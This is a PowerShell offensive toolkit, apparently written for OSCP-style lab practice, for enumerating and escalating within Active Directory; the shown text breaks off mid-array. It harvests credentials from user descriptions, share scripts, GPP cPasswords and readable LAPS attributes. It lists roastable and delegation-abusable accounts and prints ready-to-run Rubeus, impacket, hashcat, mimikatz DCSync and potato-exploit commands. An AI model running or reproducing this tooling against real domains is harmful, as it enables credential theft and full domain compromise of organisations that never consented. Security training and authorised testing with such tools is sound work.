<#
.SYNOPSIS
    husky-ad — The Husky Hacker AD Enumeration & Escalation Toolkit
.DESCRIPTION
    OSCP-friendly Active Directory enumeration script.
    No modules required — uses native .NET DirectorySearcher.
    Runs on ANY domain-joined Windows host without RSAT or PowerView.

    Built from real PG/Lab chains: hokkaido, Access-AD, Compromised-AD,
    Nagoya, Secura, Hutch, Lab A/B/C/D, Medtech
.PARAMETER DomainController
    IP or hostname of the Domain Controller
.PARAMETER Domain
    Domain name (e.g., corp.local). Auto-detected if omitted.
.PARAMETER Username
    Username for authenticated queries (optional)
.PARAMETER Password
    Password for authenticated queries
.PARAMETER Hash
    NTLM hash for pass-the-hash (requires Rubeus/etc separately)
.PARAMETER OutputDir
    Output directory (default: .\husky_ad_loot)
.PARAMETER Full
    Run extended checks (slower, more thorough)
.PARAMETER Quick
    Quick mode — critical checks only
.EXAMPLE
    .\husky-ad.ps1
    .\husky-ad.ps1 -DomainController 10.10.10.10 -Domain corp.local
    .\husky-ad.ps1 -Full -OutputDir C:\Temp\loot
.NOTES
    Author: The Husky Hacker — github.com/HackingHusky
    Site:   thehuskyhacker.com
#>

[CmdletBinding()]
param(
    [string]$DomainController = "",
    [string]$Domain = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$OutputDir = ".\husky_ad_loot",
    [switch]$Full,
    [switch]$Quick
)

# ═══════════════════════════════════════════════════════
# COLORS & FORMATTING
# ═══════════════════════════════════════════════════════
$RED = "`e[91m"
$GRN = "`e[92m"
$YEL = "`e[93m"
$BLU = "`e[94m"
$MAG = "`e[95m"
$CYN = "`e[96m"
$WHT = "`e[97m"
$BLD = "`e[1m"
$DIM = "`e[2m"
$RST = "`e[0m"

# Fallback for older PowerShell that doesn't support `e
if ($PSVersionTable.PSVersion.Major -lt 6) {
    $ESC = [char]27
    $RED = "$ESC[91m"
    $GRN = "$ESC[92m"
    $YEL = "$ESC[93m"
    $BLU = "$ESC[94m"
    $MAG = "$ESC[95m"
    $CYN = "$ESC[96m"
    $WHT = "$ESC[97m"
    $BLD = "$ESC[1m"
    $DIM = "$ESC[2m"
    $RST = "$ESC[0m"
}

function Show-Banner {
    Write-Host ""
    Write-Host "${CYN}    __  ____  _______ __ ____  __${RST}"
    Write-Host "${CYN}   / / / / / / / ___// //_/\ \ \/ /${RST}"
    Write-Host "${CYN}  / /_/ / / / /\__ \/ ,<    \  /${RST}"
    Write-Host "${CYN} / __  / /_/ /___/ / /| |   / /${RST}"
    Write-Host "${CYN}/_/ /_/\____//____/_/ |_|  /_/${RST}"
    Write-Host "${RED}    __  _____   ________ __ __________${RST}"
    Write-Host "${RED}   / / / /   | / ____/ //_// ____/ __ \${RST}"
    Write-Host "${RED}  / /_/ / /| |/ /   / ,<  / __/ / /_/ /${RST}"
    Write-Host "${RED} / __  / ___ / /___/ /| |/ /___/ _, _/${RST}"
    Write-Host "${RED}/_/ /_/_/  |_\____/_/ |_/_____/_/ |_|${RST}"
    Write-Host ""
    Write-Host "    ${BLD}A D   E N U M   &   E S C A L A T I O N${RST}"
    Write-Host "    ${DIM}No modules. No Metasploit. Just results.${RST}"
    Write-Host "    ${DIM}The Husky Hacker | thehuskyhacker.com${RST}"
    Write-Host ""
}

# ═══════════════════════════════════════════════════════
# OUTPUT FUNCTIONS
# ═══════════════════════════════════════════════════════
function Write-Section($text) {
    Write-Host ""
    Write-Host "${CYN}  +=====================================================+${RST}"
    Write-Host "${CYN}  |${RST} ${BLD}${WHT} $text${RST}"
    Write-Host "${CYN}  +=====================================================+${RST}"
}

function Write-SubSection($text) {
    Write-Host ""
    Write-Host "${BLU}    --- $text ---${RST}"
}

function Write-Sniff($text) {
    Write-Host "  ${GRN}[SNIFF]${RST} $text"
}

function Write-Growl($text) {
    Write-Host "  ${YEL}[GROWL]${RST} $text"
}

function Write-Bite($text) {
    Write-Host "  ${RED}[BITE!]${RST} ${BLD}$text${RST}"
}

function Write-Track($text) {
    Write-Host "  ${CYN}[TRACK]${RST} $text"
}

function Write-Whiff($text) {
    Write-Host "  ${RED}[WHIFF]${RST} $text"
}

function Write-Cmd($text) {
    Write-Host "  ${MAG}     RUN:${RST} $text"
}

# ═══════════════════════════════════════════════════════
# FINDINGS TRACKER
# ═══════════════════════════════════════════════════════
$script:CriticalFindings = [System.Collections.ArrayList]::new()
$script:QuickWins = [System.Collections.ArrayList]::new()
$script:ImportantFindings = [System.Collections.ArrayList]::new()

function Add-Critical($text) { [void]$script:CriticalFindings.Add($text) }
function Add-QuickWin($text) { [void]$script:QuickWins.Add($text) }
function Add-Important($text) { [void]$script:ImportantFindings.Add($text) }

# ═══════════════════════════════════════════════════════
# LDAP HELPER — Uses .NET DirectorySearcher (no modules)
# ═══════════════════════════════════════════════════════
function Get-LDAPSearch {
    param(
        [string]$Filter,
        [string[]]$Properties = @("*"),
        [string]$SearchBase = "",
        [int]$SizeLimit = 0
    )

    try {
        if ($SearchBase -eq "") { $SearchBase = $script:BaseDN }

        if ($script:LDAPPath -ne "") {
            if ($Username -ne "" -and $Password -ne "") {
                $entry = New-Object System.DirectoryServices.DirectoryEntry($script:LDAPPath, "$Domain\$Username", $Password)
            } else {
                $entry = New-Object System.DirectoryServices.DirectoryEntry($script:LDAPPath)
            }
        } else {
            $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
        }

        $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
        $searcher.Filter = $Filter
        $searcher.PageSize = 1000
        if ($SizeLimit -gt 0) { $searcher.SizeLimit = $SizeLimit }

        foreach ($prop in $Properties) {
            if ($prop -ne "*") { [void]$searcher.PropertiesToLoad.Add($prop) }
        }

        $results = $searcher.FindAll()
        return $results
    }
    catch {
        return $null
    }
}

function Get-LDAPProperty($result, $property) {
    try {
        if ($result.Properties[$property]) {
            return $result.Properties[$property][0]
        }
    } catch {}
    return $null
}

# ═══════════════════════════════════════════════════════
# SETUP & AUTO-DETECT
# ═══════════════════════════════════════════════════════
Show-Banner

# Auto-detect domain if not specified
if ($Domain -eq "") {
    try {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
        Write-Track "Auto-detected domain: $Domain"
    } catch {
        Write-Whiff "Could not auto-detect domain. Use -Domain parameter."
        exit 1
    }
}

# Auto-detect DC if not specified
if ($DomainController -eq "") {
    try {
        $DomainController = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
        Write-Track "Auto-detected DC: $DomainController"
    } catch {
        try {
            $DomainController = (Resolve-DnsName -Name $Domain -Type SRV -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -like "_ldap*" } | Select-Object -First 1).NameTarget
        } catch {
            Write-Whiff "Could not auto-detect DC. Use -DomainController parameter."
        }
    }
}

# Build base DN
$script:BaseDN = ($Domain.Split('.') | ForEach-Object { "DC=$_" }) -join ','
$script:LDAPPath = if ($DomainController -ne "") { "LDAP://${DomainController}/${script:BaseDN}" } else { "LDAP://${script:BaseDN}" }

# Create output directory
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

# Display hunt info
Write-Host "  ${BLD}Hunting Ground:${RST}  $Domain"
Write-Host "  ${BLD}Domain Controller:${RST} $DomainController"
Write-Host "  ${BLD}Current User:${RST}    $env:USERDOMAIN\$env:USERNAME"
Write-Host "  ${BLD}Loot Drop:${RST}       $OutputDir"
Write-Host "  ${BLD}Hunt Started:${RST}    $(Get-Date)"
Write-Host ""

# Get current user's SID for ACL checks later
try {
    $currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Track "Current SID: $currentSID"
} catch {}

# ═══════════════════════════════════════════════════════
# 1. DOMAIN INFORMATION
# ═══════════════════════════════════════════════════════
Write-Section "1. SNIFFING THE TERRITORY - Domain Info"

Write-SubSection "Domain Functional Level"
try {
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    Write-Track "Domain: $($domainObj.Name)"
    Write-Track "Forest: $($domainObj.Forest.Name)"
    Write-Track "Domain Controllers:"
    foreach ($dc in $domainObj.DomainControllers) {
        Write-Track "  $($dc.Name) [$($dc.IPAddress)] - $($dc.OSVersion)"
    }
} catch {
    Write-Whiff "Could not get domain object (may need domain context)"
}

# Domain functional level via LDAP
$domainResult = Get-LDAPSearch -Filter "(objectClass=domain)" -Properties @("msDS-Behavior-Version", "ms-DS-MachineAccountQuota", "minPwdLength", "lockoutThreshold", "lockoutDuration")
if ($domainResult) {
    foreach ($r in $domainResult) {
        $dfl = Get-LDAPProperty $r "msDS-Behavior-Version"
        $maq = Get-LDAPProperty $r "ms-DS-MachineAccountQuota"
        Write-Track "Domain Functional Level: $dfl"

        if ($maq -and [int]$maq -gt 0) {
            Write-Growl "MachineAccountQuota: $maq (can create computer accounts for RBCD)"
            Add-Important "MachineAccountQuota=$maq - RBCD attack possible if GenericWrite on computer"
        } else {
            Write-Track "MachineAccountQuota: $maq"
        }
    }
}

# ═══════════════════════════════════════════════════════
# 2. PASSWORD POLICY
# ═══════════════════════════════════════════════════════
Write-Section "2. TESTING THE FENCE - Password Policy"

if ($domainResult) {
    foreach ($r in $domainResult) {
        $minLen = Get-LDAPProperty $r "minPwdLength"
        $lockoutThreshold = Get-LDAPProperty $r "lockoutThreshold"
        $lockoutDuration = Get-LDAPProperty $r "lockoutDuration"
        $pwdHistory = Get-LDAPProperty $r "pwdHistoryLength"
        $complexity = Get-LDAPProperty $r "pwdProperties"

        Write-Track "Min Password Length: $minLen"
        Write-Track "Lockout Threshold: $lockoutThreshold"
        Write-Track "Password History: $pwdHistory"

        if ($minLen -and [int]$minLen -lt 8) {
            Write-Bite "WEAK PASSWORD POLICY - min length: $minLen"
            Add-Critical "Weak password policy (min length: $minLen)"
        }

        if ($lockoutThreshold -eq 0) {
            Write-Bite "NO ACCOUNT LOCKOUT - spray freely!"
            Add-Critical "No account lockout threshold - unlimited password spraying"
            Add-QuickWin "No lockout -> password spray all users with common passwords"
        } elseif ($lockoutThreshold) {
            Write-Track "Lockout after $lockoutThreshold attempts"
        }

        "Password Policy:`nMin Length: $minLen`nLockout: $lockoutThreshold`nHistory: $pwdHistory" |
            Out-File "$OutputDir\password_policy.txt"
    }
}

# ═══════════════════════════════════════════════════════
# 3. USER ENUMERATION
# ═══════════════════════════════════════════════════════
Write-Section "3. TRACKING THE PACK - User Enumeration"

Write-SubSection "All Domain Users"
$allUsers = Get-LDAPSearch -Filter "(&(objectClass=user)(objectCategory=person))" -Properties @("sAMAccountName", "description", "memberOf", "userAccountControl", "servicePrincipalName", "adminCount", "pwdLastSet", "lastLogon", "msDS-AllowedToDelegateTo")

$userList = [System.Collections.ArrayList]::new()
$asrepUsers = [System.Collections.ArrayList]::new()
$kerbUsers = [System.Collections.ArrayList]::new()
$adminCountUsers = [System.Collections.ArrayList]::new()
$delegationUsers = [System.Collections.ArrayList]::new()
$descPasswords = [System.Collections.ArrayList]::new()
$disabledUsers = [System.Collections.ArrayList]::new()

if ($allUsers) {
    foreach ($user in $allUsers) {
        $sam = Get-LDAPProperty $user "sAMAccountName"
        $desc = Get-LDAPProperty $user "description"
        $uac = Get-LDAPProperty $user "userAccountControl"
        $spns = $user.Properties["servicePrincipalName"]
        $admin = Get-LDAPProperty $user "adminCount"
        $delegation = $user.Properties["msDS-AllowedToDelegateTo"]

        if ($sam) { [void]$userList.Add($sam) }

        # Check if disabled
        if ($uac -band 2) {
            [void]$disabledUsers.Add($sam)
            continue
        }

        # AS-REP Roastable (UAC 4194304 = DONT_REQ_PREAUTH)
        if ($uac -band 4194304) {
            [void]$asrepUsers.Add($sam)
        }

        # Kerberoastable (has SPN)
        if ($spns -and $spns.Count -gt 0) {
            $spnList = ($spns | ForEach-Object { $_.ToString() }) -join ", "
            [void]$kerbUsers.Add("$sam | $spnList")
        }

        # AdminCount
        if ($admin -eq 1) {
            [void]$adminCountUsers.Add($sam)
        }

        # Constrained Delegation
        if ($delegation -and $delegation.Count -gt 0) {
            $delList = ($delegation | ForEach-Object { $_.ToString() }) -join ", "
            [void]$delegationUsers.Add("$sam -> $delList")
        }

        # Password in description
        if ($desc -and $desc -match "pass|pwd|cred|secret|temp|p@ss|P@ss") {
            [void]$descPasswords.Add("$sam : $desc")
        }
    }

    Write-Sniff "Found $($userList.Count) domain users ($($disabledUsers.Count) disabled)"
    $userList | Out-File "$OutputDir\users.txt"
    Write-Track "User list saved to $OutputDir\users.txt"
}

# Description passwords
Write-SubSection "Password Hunting - Descriptions"
if ($descPasswords.Count -gt 0) {
    Write-Bite "PASSWORDS FOUND IN USER DESCRIPTIONS!"
    foreach ($dp in $descPasswords) {
        Write-Bite "  $dp"
    }
    $descPasswords | Out-File "$OutputDir\description_passwords.txt"
    Add-Critical "Password(s) in user description fields"
    Add-QuickWin "Description passwords found - test credentials immediately"
} else {
    Write-Track "No obvious passwords in descriptions"
}

# AdminCount users
Write-SubSection "High-Value Targets (AdminCount=1)"
if ($adminCountUsers.Count -gt 0) {
    foreach ($ac in $adminCountUsers) {
        Write-Growl "AdminCount=1: $ac"
    }
    $adminCountUsers | Out-File "$OutputDir\admincount_users.txt"
}

# ═══════════════════════════════════════════════════════
# 4. KERBEROS ATTACKS
# ═══════════════════════════════════════════════════════
Write-Section "4. CRACKING BONES - Kerberos Attacks"

# AS-REP Roastable
Write-SubSection "AS-REP Roasting (No Preauth)"
if ($asrepUsers.Count -gt 0) {
    Write-Bite "AS-REP ROASTABLE USERS FOUND!"
    foreach ($ar in $asrepUsers) {
        Write-Bite "  Roastable: $ar"
    }
    $asrepUsers | Out-File "$OutputDir\asrep_users.txt"
    Add-Critical "AS-REP roastable users: $($asrepUsers.Count)"
    Add-QuickWin "AS-REP roast from Kali: impacket-GetNPUsers '$Domain/' -usersfile users.txt -no-pass -dc-ip $DomainController"
    Write-Cmd ".\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
    Write-Cmd "impacket-GetNPUsers '$Domain/' -usersfile $OutputDir\users.txt -no-pass -dc-ip $DomainController"
    Write-Cmd "hashcat -m 18200 asrep.txt rockyou.txt"
} else {
    Write-Track "No AS-REP roastable users"
}

# Kerberoasting
Write-SubSection "Kerberoasting (Service Accounts with SPNs)"
if ($kerbUsers.Count -gt 0) {
    Write-Bite "KERBEROASTABLE ACCOUNTS FOUND!"
    foreach ($ku in $kerbUsers) {
        Write-Bite "  $ku"
    }
    $kerbUsers | Out-File "$OutputDir\kerberoastable_users.txt"
    Add-Critical "Kerberoastable service accounts: $($kerbUsers.Count)"
    Add-QuickWin "Kerberoast: hashcat -m 13100 kerb.txt rockyou.txt"
    Write-Cmd ".\Rubeus.exe kerberoast /domain:$Domain /dc:$DomainController /nowrap"
    Write-Cmd "impacket-GetUserSPNs '${Domain}/${Username}:${Password}' -dc-ip $DomainController -request"
    Write-Cmd "hashcat -m 13100 kerb.txt rockyou.txt"
} else {
    Write-Track "No Kerberoastable accounts"
}

# ═══════════════════════════════════════════════════════
# 5. DELEGATION
# ═══════════════════════════════════════════════════════
Write-Section "5. FINDING THE WEAK LINK - Delegation"

# Unconstrained Delegation (computers)
Write-SubSection "Unconstrained Delegation"
$unconst = Get-LDAPSearch -Filter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties @("sAMAccountName", "dNSHostName")
if ($unconst -and $unconst.Count -gt 0) {
    Write-Bite "UNCONSTRAINED DELEGATION FOUND!"
    foreach ($u in $unconst) {
        $name = Get-LDAPProperty $u "dNSHostName"
        Write-Bite "  $name"
    }
    Add-Critical "Unconstrained delegation on computer objects"
} else {
    Write-Track "No unconstrained delegation (DCs excluded)"
}

# Constrained Delegation
Write-SubSection "Constrained Delegation"
if ($delegationUsers.Count -gt 0) {
    Write-Growl "Constrained Delegation found:"
    foreach ($du in $delegationUsers) {
        Write-Growl "  $du"
    }
    $delegationUsers | Out-File "$OutputDir\constrained_delegation.txt"
    Add-Important "Constrained delegation - S4U impersonation possible"
    Write-Cmd "impacket-getST -spn 'cifs/TARGET' -impersonate Administrator '$Domain/svc:pass' -dc-ip $DomainController"
} else {
    Write-Track "No constrained delegation on user accounts"
}

# Constrained Delegation on computers
$constComp = Get-LDAPSearch -Filter "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" -Properties @("sAMAccountName", "msDS-AllowedToDelegateTo")
if ($constComp) {
    foreach ($cc in $constComp) {
        $ccName = Get-LDAPProperty $cc "sAMAccountName"
        $ccDel = $cc.Properties["msDS-AllowedToDelegateTo"]
        if ($ccDel) {
            $ccDelStr = ($ccDel | ForEach-Object { $_.ToString() }) -join ", "
            Write-Growl "Computer delegation: $ccName -> $ccDelStr"
        }
    }
}

# RBCD
Write-SubSection "Resource-Based Constrained Delegation"
$rbcd = Get-LDAPSearch -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -Properties @("sAMAccountName")
if ($rbcd) {
    foreach ($r in $rbcd) {
        $rName = Get-LDAPProperty $r "sAMAccountName"
        Write-Growl "RBCD configured on: $rName"
    }
    Add-Important "RBCD already configured on some objects"
}

# ═══════════════════════════════════════════════════════
# 6. SMB SHARES
# ═══════════════════════════════════════════════════════
Write-Section "6. RAIDING THE DEN - SMB Shares"

$sharesToCheck = @($DomainController)
# Also add other DCs
try {
    $domainObj2 = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    foreach ($dc in $domainObj2.DomainControllers) {
        if ($dc.Name -notin $sharesToCheck) { $sharesToCheck += $dc.Name }
    }
} catch {}

foreach ($shareHost in $sharesToCheck) {
    Write-SubSection "Shares on $shareHost"
    try {
        $shares = net view "\\$shareHost" /all 2>$null
        if ($shares) {
            foreach ($line in $shares) {
                if ($line -match "^\s*(\S+)\s+(Disk|Print)") {
                    $shareName = $Matches[1]
                    Write-Track "Share: \\$shareHost\$shareName"

                    # Test read access
                    try {
                        $testPath = "\\$shareHost\$shareName"
                        $items = Get-ChildItem $testPath -ErrorAction Stop | Select-Object -First 5
                        Write-Sniff "READABLE: \\$shareHost\$shareName ($($items.Count) items)"

                        # Test write access
                        try {
                            $testFile = Join-Path $testPath ".husky_write_test"
                            [IO.File]::WriteAllText($testFile, "test")
                            Remove-Item $testFile -Force
                            Write-Bite "WRITABLE: \\$shareHost\$shareName"
                            Add-Important "Writable share: \\$shareHost\$shareName"
                        } catch {}

                        # Look for interesting files
                        try {
                            $interesting = Get-ChildItem $testPath -Recurse -ErrorAction SilentlyContinue -Include `
                                "*.config", "*.xml", "*.ini", "*.txt", "*.ps1", "*.bat", "*.cmd", "*.vbs", `
                                "*.bak", "*.old", "*.conf", "*.cfg", "web.config", "*.kdbx", "*.key", `
                                "*.pfx", "*.pem", "unattend*" | Select-Object -First 20

                            if ($interesting) {
                                foreach ($f in $interesting) {
                                    Write-Growl "Interesting file: $($f.FullName)"
                                }
                                $interesting.FullName | Out-File "$OutputDir\interesting_share_files.txt" -Append
                            }
                        } catch {}
                    } catch {
                        Write-Track "No read access to \\$shareHost\$shareName"
                    }
                }
            }
        }
    } catch {
        Write-Whiff "Could not enumerate shares on $shareHost"
    }
}

# SYSVOL/NETLOGON script hunting
Write-SubSection "SYSVOL & NETLOGON Script Hunting"
$sysvolPath = "\\$DomainController\SYSVOL\$Domain"
$netlogonPath = "\\$DomainController\NETLOGON"

foreach ($huntPath in @($sysvolPath, $netlogonPath)) {
    try {
        $scripts = Get-ChildItem $huntPath -Recurse -ErrorAction SilentlyContinue -Include `
            "*.ps1", "*.bat", "*.cmd", "*.vbs", "*.xml", "Groups.xml", "*.ini" | Select-Object -First 30

        foreach ($script in $scripts) {
            Write-Sniff "Script: $($script.FullName)"

            # Check for credentials in scripts
            try {
                $content = Get-Content $script.FullName -ErrorAction SilentlyContinue -Raw
                if ($content -match "(?i)(password|passwd|pwd|cpassword|credential|secret)\s*[=:]\s*\S+") {
                    Write-Bite "CREDENTIALS IN SCRIPT: $($script.FullName)"
                    Write-Bite "  Match: $($Matches[0])"
                    Add-Critical "Credentials found in $($script.Name)"
                    Add-QuickWin "Read $($script.FullName) for plaintext credentials"
                }

                # GPP cPassword
                if ($content -match "cpassword") {
                    Write-Bite "GPP cPASSWORD FOUND: $($script.FullName)"
                    Add-Critical "GPP cPassword in $($script.Name) - decrypt with gpp-decrypt"
                    Write-Cmd "gpp-decrypt '<cpassword_value>'"
                }
            } catch {}
        }
    } catch {
        Write-Track "Could not access $huntPath"
    }
}

# ═══════════════════════════════════════════════════════
# 7. LAPS
# ═══════════════════════════════════════════════════════
Write-Section "7. DIGGING UP BONES - LAPS Passwords"

# LAPS v1
$laps = Get-LDAPSearch -Filter "(ms-MCS-AdmPwd=*)" -Properties @("sAMAccountName", "ms-MCS-AdmPwd", "ms-MCS-AdmPwdExpirationTime")
if ($laps) {
    Write-Bite "LAPS PASSWORDS READABLE!"
    foreach ($l in $laps) {
        $compName = Get-LDAPProperty $l "sAMAccountName"
        $lapsPass = Get-LDAPProperty $l "ms-MCS-AdmPwd"
        Write-Bite "  $compName : $lapsPass"
    }
    Add-Critical "LAPS passwords readable - local admin on those computers"
    Add-QuickWin "LAPS -> evil-winrm/psexec as local Administrator with found password"
} else {
    # Check if LAPS is even deployed
    $lapsCheck = Get-LDAPSearch -Filter "(&(objectCategory=computer)(ms-MCS-AdmPwdExpirationTime=*))" -Properties @("sAMAccountName") -SizeLimit 1
    if ($lapsCheck) {
        Write-Track "LAPS deployed but passwords not readable with current privileges"
    } else {
        Write-Track "LAPS does not appear to be deployed"
    }
}

# LAPS v2 (Windows LAPS)
$lapsv2 = Get-LDAPSearch -Filter "(msLAPS-Password=*)" -Properties @("sAMAccountName", "msLAPS-Password")
if ($lapsv2) {
    Write-Bite "WINDOWS LAPS v2 PASSWORDS READABLE!"
    foreach ($l2 in $lapsv2) {
        $compName = Get-LDAPProperty $l2 "sAMAccountName"
        Write-Bite "  $compName has readable LAPS v2 password"
    }
    Add-Critical "Windows LAPS v2 passwords readable"
}

# ═══════════════════════════════════════════════════════
# 8. GMSA
# ═══════════════════════════════════════════════════════
Write-Section "8. BURIED TREASURE - GMSA Accounts"

$gmsa = Get-LDAPSearch -Filter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties @("sAMAccountName", "msDS-GroupMSAMembership", "msDS-ManagedPasswordId")
if ($gmsa) {
    Write-Growl "GMSA accounts found:"
    foreach ($g in $gmsa) {
        $gmsaName = Get-LDAPProperty $g "sAMAccountName"
        Write-Growl "  $gmsaName"
    }
    Add-Important "GMSA accounts exist - check if current user can read msDS-ManagedPassword"
    Write-Cmd "bloodyAD -d $Domain -u USER -p PASS --host $DomainController get object 'GMSA$' --attr msDS-ManagedPassword"
} else {
    Write-Track "No GMSA accounts found"
}

# ═══════════════════════════════════════════════════════
# 9. PRIVILEGED GROUPS
# ═══════════════════════════════════════════════════════
Write-Section "9. THE ALPHA DOGS - Privileged Groups"

$privGroups = @(
    "Domain Admins", "Enterprise Admins", "Administrators",
    "Account Operators", "Server Operators", "Backup Operators",
    "DnsAdmins", "Exchange Windows Permissions",
    "Remote Desktop Users", "Remote Management Users",
    "Group Policy Creator Owners", "Schema Admins"
)

foreach ($group in $privGroups) {
    $members = Get-LDAPSearch -Filter "(&(objectClass=user)(memberOf=CN=$group,CN=Users,$($script:BaseDN)))" -Properties @("sAMAccountName")

    # Also check Builtin container
    if (-not $members -or $members.Count -eq 0) {
        $members = Get-LDAPSearch -Filter "(&(objectClass=user)(memberOf=CN=$group,CN=Builtin,$($script:BaseDN)))" -Properties @("sAMAccountName")
    }

    if ($members -and $members.Count -gt 0) {
        Write-Sniff "${group}:"
        foreach ($m in $members) {
            $mName = Get-LDAPProperty $m "sAMAccountName"
            Write-Host "      $mName"
        }
    }
}

# Current user's groups
Write-SubSection "Your Privileges"
try {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)

    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Bite "RUNNING AS LOCAL ADMIN!"
    }

    Write-Track "Groups for $($identity.Name):"
    foreach ($group in $identity.Groups) {
        try {
            $groupName = $group.Translate([System.Security.Principal.NTAccount]).Value
            Write-Track "  $groupName"

            # Flag dangerous groups
            switch -Regex ($groupName) {
                "Domain Admins"     { Write-Bite "DOMAIN ADMIN!"; Add-Critical "Current user is Domain Admin" }
                "DnsAdmins"         { Write-Bite "DnsAdmins - DLL injection -> SYSTEM!"; Add-Critical "DnsAdmins -> dnscmd DLL load" }
                "Backup Operators"  { Write-Bite "Backup Operators - can dump SAM!"; Add-Critical "Backup Operators -> backup SAM/SYSTEM/NTDS" }
                "Server Operators"  { Write-Bite "Server Operators - service hijack!"; Add-Critical "Server Operators -> service binary -> SYSTEM" }
                "Account Operators" { Write-Growl "Account Operators - can modify accounts"; Add-Important "Account Operators membership" }
            }
        } catch {}
    }
} catch {
    Write-Whiff "Could not enumerate current user's groups"
}

# Check current privileges
Write-SubSection "Token Privileges"
$privs = whoami /priv 2>$null
if ($privs) {
    $dangerousPrivs = @("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeBackupPrivilege",
                        "SeRestorePrivilege", "SeDebugPrivilege", "SeTakeOwnershipPrivilege",
                        "SeLoadDriverPrivilege", "SeTcbPrivilege")

    foreach ($dp in $dangerousPrivs) {
        if ($privs -match $dp) {
            Write-Bite "Dangerous privilege: $dp"

            if ($dp -eq "SeImpersonatePrivilege") {
                Add-Critical "SeImpersonatePrivilege -> potato attack -> SYSTEM"
                Add-QuickWin "Potato attack: GodPotato / JuicyPotatoNG / PrintSpoofer"
            }
            if ($dp -eq "SeBackupPrivilege") {
                Add-Critical "SeBackupPrivilege -> dump SAM/SYSTEM/NTDS.dit"
            }
            if ($dp -eq "SeDebugPrivilege") {
                Add-Critical "SeDebugPrivilege -> dump LSASS -> credentials"
            }
        }
    }
}

# ═══════════════════════════════════════════════════════
# 10. COMPUTER OBJECTS
# ═══════════════════════════════════════════════════════
Write-Section "10. MAPPING THE TERRITORY - Computers"

$computers = Get-LDAPSearch -Filter "(objectClass=computer)" -Properties @("sAMAccountName", "dNSHostName", "operatingSystem", "operatingSystemVersion")
if ($computers) {
    $compList = [System.Collections.ArrayList]::new()
    $legacyOS = [System.Collections.ArrayList]::new()

    foreach ($comp in $computers) {
        $cName = Get-LDAPProperty $comp "dNSHostName"
        $cOS = Get-LDAPProperty $comp "operatingSystem"
        $cVer = Get-LDAPProperty $comp "operatingSystemVersion"
        [void]$compList.Add("$cName | $cOS $cVer")

        if ($cOS -match "2008|2003|Windows 7|Windows XP|Vista") {
            [void]$legacyOS.Add("$cName | $cOS")
        }
    }

    Write-Track "Domain computers: $($compList.Count)"
    $compList | Out-File "$OutputDir\computers.txt"

    if ($legacyOS.Count -gt 0) {
        Write-Bite "LEGACY OS DETECTED!"
        foreach ($lo in $legacyOS) {
            Write-Bite "  $lo"
        }
        Add-Critical "Legacy OS found - check EternalBlue (MS17-010), BlueKeep"
    }
}

# ═══════════════════════════════════════════════════════
# 11. DOMAIN TRUSTS
# ═══════════════════════════════════════════════════════
Write-Section "11. NEIGHBORING PACKS - Domain Trusts"

try {
    $trusts = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()
    if ($trusts.Count -gt 0) {
        foreach ($trust in $trusts) {
            Write-Growl "Trust: $($trust.TargetName) | Direction: $($trust.TrustDirection) | Type: $($trust.TrustType)"
        }
        Add-Important "Domain trusts exist - potential for cross-domain escalation"
    } else {
        Write-Track "No domain trusts found"
    }
} catch {
    # LDAP fallback
    $ldapTrusts = Get-LDAPSearch -Filter "(objectClass=trustedDomain)" -Properties @("cn", "trustDirection", "trustType")
    if ($ldapTrusts) {
        foreach ($lt in $ldapTrusts) {
            $tName = Get-LDAPProperty $lt "cn"
            $tDir = Get-LDAPProperty $lt "trustDirection"
            Write-Growl "Trust: $tName (direction: $tDir)"
        }
    } else {
        Write-Track "No domain trusts found"
    }
}

# ═══════════════════════════════════════════════════════
# 12. ACL ABUSE — Current User
# ═══════════════════════════════════════════════════════
Write-Section "12. SNIFFING FOR CONTROL - ACL Quick Check"

Write-Track "Checking for common ACL abuse paths..."
Write-Track "For full ACL analysis, use BloodHound:"
Write-Cmd "bloodhound-python -u USER -p PASS -d $Domain -ns $DomainController -c All"
Write-Cmd ".\SharpHound.exe -c All --domain $Domain"

# Check if we can DCSync
Write-SubSection "DCSync Rights Check"
Write-Track "If you have Replicating Directory Changes + All:"
Write-Cmd "impacket-secretsdump '${Domain}/$($env:USERNAME):PASSWORD'@${DomainController}"
Write-Cmd "mimikatz # lsadump::dcsync /domain:${Domain} /user:Administrator"

# ═══════════════════════════════════════════════════════
# 13. DNS
# ═══════════════════════════════════════════════════════
if (-not $Quick) {
    Write-Section "13. HOWLING AT DNS"

    try {
        $dnsRecords = Resolve-DnsName -Name $Domain -Type ANY -Server $DomainController -ErrorAction SilentlyContinue
        if ($dnsRecords) {
            foreach ($record in $dnsRecords) {
                Write-Track "$($record.Type): $($record.Name) -> $($record.IPAddress)$($record.NameHost)"
            }
        }
    } catch {}
}

# ═══════════════════════════════════════════════════════
# 14. EXTENDED CHECKS
# ═══════════════════════════════════════════════════════
if ($Full) {
    Write-Section "14. OFF THE LEASH - Extended Checks"

    # Network services on DC
    Write-SubSection "DC Services"
    $portsToCheck = @(
        @{Port=88;   Service="Kerberos"},
        @{Port=135;  Service="MSRPC"},
        @{Port=389;  Service="LDAP"},
        @{Port=445;  Service="SMB"},
        @{Port=636;  Service="LDAPS"},
        @{Port=1433; Service="MSSQL"},
        @{Port=3268; Service="GC"},
